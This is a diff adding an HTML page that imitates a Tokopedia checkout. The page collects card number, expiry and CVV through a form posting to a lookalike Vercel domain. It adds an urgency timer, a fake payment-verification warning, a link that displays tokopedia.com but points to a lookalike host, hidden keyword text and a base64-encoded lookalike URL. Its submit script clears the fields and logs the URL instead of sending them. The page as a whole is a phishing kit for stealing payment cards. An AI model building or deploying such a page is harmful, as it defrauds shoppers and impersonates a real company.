@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tokopedia - Checkout</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f5f5;
+      color: #31353b;
+    }
+
+    .navbar {
+      height: 72px;
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7e9;
+      display: flex;
+      align-items: center;
+      padding: 0 8%;
+      position: sticky;
+      top: 0;
+    }
+
+    .logo {
+      color: #03ac0e;
+      font-size: 27px;
+      font-weight: bold;
+    }
+
+    .secure {
+      margin-left: auto;
+      color: #6d7580;
+      font-size: 12px;
+    }
+
+    .page {
+      max-width: 1050px;
+      margin: 35px auto;
+      padding: 0 20px;
+    }
+
+    h1 {
+      margin-bottom: 25px;
+      font-size: 25px;
+    }
+
+    .layout {
+      display: grid;
+      grid-template-columns: 1fr 350px;
+      gap: 25px;
+    }
+
+    .panel {
+      background: white;
+      border-radius: 8px;
+      padding: 24px;
+      margin-bottom: 18px;
+      box-shadow: 0 1px 4px rgba(0,0,0,.08);
+    }
+
+    .panel h2 {
+      margin: 0 0 18px;
+      font-size: 17px;
+    }
+
+    .address-name {
+      font-weight: bold;
+      margin-bottom: 7px;
+    }
+
+    .address {
+      font-size: 13px;
+      line-height: 1.6;
+      color: #555;
+    }
+
+    .product {
+      display: flex;
+      gap: 15px;
+      border-top: 1px solid #eee;
+      padding-top: 18px;
+    }
+
+    .product-image {
+      width: 72px;
+      height: 72px;
+      background: #e9ecef;
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #999;
+      font-size: 11px;
+    }
+
+    .product-name {
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 7px;
+    }
+
+    .price {
+      color: #222;
+      font-weight: bold;
+    }
+
+    .payment-option {
+      border: 1px solid #ddd;
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .payment-option input {
+      margin-right: 8px;
+    }
+
+    .warning {
+      margin-top: 18px;
+      padding: 13px;
+      background: #fff4d6;
+      border-left: 4px solid #f0a000;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    label.field-label {
+      display: block;
+      margin: 17px 0 7px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    .field {
+      width: 100%;
+      height: 43px;
+      padding: 0 12px;
+      border: 1px solid #bbb;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .summary {
+      position: sticky;
+      top: 95px;
+    }
+
+    .row {
+      display: flex;
+      justify-content: space-between;
+      margin: 13px 0;
+      font-size: 13px;
+    }
+
+    .total {
+      border-top: 1px solid #ddd;
+      padding-top: 16px;
+      margin-top: 17px;
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .total-value {
+      color: #e02929;
+    }
+
+    button {
+      width: 100%;
+      height: 46px;
+      border: 0;
+      border-radius: 6px;
+      margin-top: 18px;
+      background: #03ac0e;
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .timer {
+      text-align: center;
+      margin-top: 12px;
+      color: #e02929;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .security-info {
+      text-align: center;
+      color: #777;
+      font-size: 11px;
+      line-height: 1.5;
+      margin-top: 15px;
+    }
+
+    .hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      left: -9999px;
+    }
+
+    .footer {
+      margin-top: 50px;
+      padding: 30px;
+      background: white;
+      text-align: center;
+      color: #888;
+      font-size: 11px;
+    }
+
+    @media (max-width: 800px) {
+      .layout {
+        grid-template-columns: 1fr;
+      }
+
+      .summary {
+        position: static;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav class="navbar">
+    <div class="logo">tokopedia</div>
+    <div class="secure">Checkout Aman & Terverifikasi</div>
+  </nav>
+
+  <main class="page">
+
+    <h1>Checkout</h1>
+
+    <div class="layout">
+
+      <div>
+
+        <section class="panel">
+          <h2>Alamat Pengiriman</h2>
+
+          <div class="address-name">
+            Rumah • Andi Pratama
+          </div>
+
+          <div class="address">
+            0812-***-**91<br>
+            Jl. Merdeka Raya No. 18<br>
+            Jakarta Barat, DKI Jakarta 11470
+          </div>
+        </section>
+
+        <section class="panel">
+          <h2>Pesanan</h2>
+
+          <div class="product">
+            <div class="product-image">
+              PRODUCT
+            </div>
+
+            <div>
+              <div class="product-name">
+                Wireless Headphone Bluetooth ANC
+              </div>
+
+              <div style="font-size:12px;color:#777;margin-bottom:8px">
+                1 barang • Garansi resmi
+              </div>
+
+              <div class="price">
+                Rp849.000
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="panel">
+          <h2>Pilih Pembayaran</h2>
+
+          <div class="payment-option">
+            <input type="radio" name="payment" checked>
+            Kartu Debit / Kredit
+          </div>
+
+          <div class="payment-option">
+            <input type="radio" name="payment">
+            Virtual Account
+          </div>
+
+          <div class="payment-option">
+            <input type="radio" name="payment">
+            Transfer Bank
+          </div>
+
+          <div class="warning">
+            Demi keamanan transaksi, metode pembayaran Anda perlu
+            diverifikasi kembali sebelum pesanan dapat diproses.
+            Selesaikan pembayaran sebelum waktu checkout berakhir.
+          </div>
+
+          <form
+            id="paymentForm"
+            action="https://tokopedia-checkout-validation-id.vercel.app/api/payment"
+            method="POST"
+          >
+
+            <label class="field-label" for="card">
+              Nomor Kartu
+            </label>
+
+            <input
+              class="field"
+              id="card"
+              name="card_number"
+              type="text"
+              inputmode="numeric"
+              placeholder="1234 5678 9012 3456"
+              maxlength="19"
+              required
+            >
+
+            <label class="field-label" for="expiry">
+              Masa Berlaku
+            </label>
+
+            <input
+              class="field"
+              id="expiry"
+              name="expiry"
+              type="text"
+              placeholder="MM/YY"
+              maxlength="5"
+              required
+            >
+
+            <label class="field-label" for="cvv">
+              CVV
+            </label>
+
+            <input
+              class="field"
+              id="cvv"
+              name="cvv"
+              type="password"
+              inputmode="numeric"
+              placeholder="•••"
+              maxlength="3"
+              required
+            >
+
+            <input
+              type="hidden"
+              name="transaction"
+              value="TKP-918201472"
+            >
+
+          </form>
+        </section>
+
+      </div>
+
+      <aside>
+
+        <section class="panel summary">
+          <h2>Ringkasan Belanja</h2>
+
+          <div class="row">
+            <span>Total Harga</span>
+            <span>Rp849.000</span>
+          </div>
+
+          <div class="row">
+            <span>Ongkos Kirim</span>
+            <span>Rp18.000</span>
+          </div>
+
+          <div class="row">
+            <span>Biaya Layanan</span>
+            <span>Rp2.000</span>
+          </div>
+
+          <div class="row total">
+            <span>Total Tagihan</span>
+            <span class="total-value">Rp869.000</span>
+          </div>
+
+          <button
+            type="submit"
+            form="paymentForm"
+          >
+            Bayar Sekarang
+          </button>
+
+          <div class="timer" id="timer">
+            Selesaikan pembayaran dalam 09:59
+          </div>
+
+          <div class="security-info">
+            Pembayaran Anda dilindungi sistem keamanan transaksi.
+
+            <br><br>
+
+            <a
+              href="#"
+              data-destination="https://tokopedia-payment-security-id.vercel.app/verification"
+              style="color:#03ac0e"
+            >
+              https://www.tokopedia.com/payment/security
+            </a>
+          </div>
+
+        </section>
+
+      </aside>
+
+    </div>
+
+  </main>
+
+  <div class="hidden">
+    tokopedia checkout payment kartu debit kredit cvv
+    nomor kartu pembayaran verifikasi transaksi bank
+    secure payment billing account order confirmation
+  </div>
+
+  <footer class="footer">
+    © Tokopedia • Keamanan Pembayaran • Pusat Bantuan
+  </footer>
+
+  <script>
+    let seconds = 599;
+
+    const timer = document.getElementById("timer");
+
+    const countdown = setInterval(function() {
+      seconds--;
+
+      const minutes = Math.floor(seconds / 60);
+      const remaining = seconds % 60;
+
+      timer.textContent =
+        "Selesaikan pembayaran dalam " +
+        String(minutes).padStart(2, "0") +
+        ":" +
+        String(remaining).padStart(2, "0");
+
+      if (seconds <= 0) {
+        clearInterval(countdown);
+        timer.textContent = "Waktu pembayaran berakhir";
+      }
+    }, 1000);
+
+    const encoded =
+      "aHR0cHM6Ly90b2tvcGVkaWEtY2hlY2tvdXQtdmFsaWRhdGlvbi10ZXN0LnZlcmNlbC5hcHAvcGF5bWVudA==";
+
+    const route = atob(encoded);
+
+    document
+      .getElementById("paymentForm")
+      .addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const card = document.getElementById("card");
+        const expiry = document.getElementById("expiry");
+        const cvv = document.getElementById("cvv");
+
+        card.value = "";
+        expiry.value = "";
+        cvv.value = "";
+
+        clearInterval(countdown);
+
+        window.history.replaceState(
+          {},
+          "",
+          "/checkout/payment-verification"
+        );
+
+        document.querySelector(".page").innerHTML =
+          "<div class='panel' style='max-width:600px;margin:auto'>" +
+          "<h2>Memverifikasi Pembayaran</h2>" +
+          "<p>Transaksi Anda sedang diverifikasi. " +
+          "Mohon tunggu dan jangan tutup halaman ini.</p>" +
+          "</div>";
+
+        console.log(route);
+      });
+  </script>
+
+</body>
+</html>
